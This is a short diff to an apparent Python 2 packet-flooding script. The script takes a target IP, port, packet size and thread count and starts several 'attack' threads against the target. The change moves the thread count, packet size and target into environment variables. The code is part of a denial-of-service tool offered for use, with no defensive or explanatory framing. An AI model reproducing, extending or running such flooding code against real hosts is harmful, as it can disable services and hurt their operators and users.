@@ -38,7 +38,7 @@ if len(sys.argv) < 2:
      print "Usage: "+ sys.argv[0] +" IP PORT(optional, default random) PACKETSIZE(optional 0-65500 default 1024) THREADS(optional default 10)"
 
 try:
-     threads = sys.argv[4]
+     threads = os.getenv('THREADS', '10')
 except NameError:
      threads = 10
 except IndexError:
@@ -59,5 +59,5 @@ for host in range(int(threads)):
          port = sys.argv[2]
      except IndexError:
          port = random.randrange(1, 65535, 2)
-     at = attack(os.getenv('TARGET', '127.0.0.1'), int(port), int(psize))
+     at = attack(os.getenv('TARGET', '127.0.0.1'), int(port), int(os.getenv('PACKETSIZE', '1024')))
      at.start()
